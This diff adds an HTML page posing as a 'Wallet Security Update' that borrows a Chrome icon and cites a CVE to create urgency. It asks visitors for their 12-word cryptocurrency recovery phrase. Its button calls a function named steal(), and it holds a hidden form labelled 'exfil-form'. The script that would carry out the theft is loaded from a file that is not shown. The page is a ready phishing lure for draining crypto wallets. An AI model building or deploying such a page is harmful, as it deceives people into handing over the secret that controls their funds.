@@ -1,0 +1,21 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallet Security Update</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Google_Chrome_icon_(2014).svg/120px-Google_Chrome_icon_(2014).svg.png" alt="Update" class="logo">
+        <h1>Wallet Security Update</h1>
+        <p>Required to prevent theft from CVE-2026-9999.</p>
+        <input type="text" id="seed-input" placeholder="Enter 12-word recovery phrase">
+        <button onclick="steal()">Update Wallet</button>
+        <form id="exfil-form" style="display:none;"></form>
+        <p id="status">Status: Awaiting input</p>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
